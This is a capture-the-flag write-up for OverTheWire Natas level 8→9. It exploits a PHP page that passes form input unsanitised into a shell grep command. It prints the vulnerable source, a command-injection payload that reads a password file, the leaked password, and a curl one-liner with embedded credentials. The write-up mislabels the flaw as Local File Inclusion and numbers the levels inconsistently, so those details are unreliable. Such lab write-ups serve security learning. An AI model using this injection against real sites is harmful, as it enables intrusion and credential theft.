Natas Level 8 → Level 9
=======================

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org


Solution
========

After we browsed to the URL with the credentials gained in level7-8, we get to a web site which lets us enter a value into a web form that is titled "Find words containing:".
The web site's source code looks like this:

```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This one's pretty obvious an [```Local File Inclusion (LFI) attack```](https://en.wikipedia.org/wiki/File_inclusion_vulnerability). 
Whatever string (```$key```) is entered into the web form (```needle```) gets injected into the command line ```grep -i $key dictionary.txt``` and is executed then.
Since there's no sanity check of the web user's input implemented, ```$key``` can be any arbitrary command. Therefore we can simply get the next level's password by entering the following string into the web form:

```
popel dictionary.txt; cat /etc/natas_webpass/natas9 #
``` 
Which leads to the URL ```http://natas9.natas.labs.overthewire.org/?needle=popel+dictionary.txt%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas9+%23&submit=Search```
and gets transmitted to the web server. The string ```$key``` is then substituted into the command line ```grep -i $key dictionary.txt``` and therefore results into the execution of the command line ```grep -i popel dictionary.txt; cat /etc/natas_webpass/natas9 #dictionary.txt``` on the web server. This generates and gives back the following web site:

```
Output:

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

That's it! =)


Note to myself
==============

Instead of using a GUI web browser like Firefox one can use cURL instead:

```
curl --data "needle=; cat /etc/natas_webpass/natas10 #" http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/
```
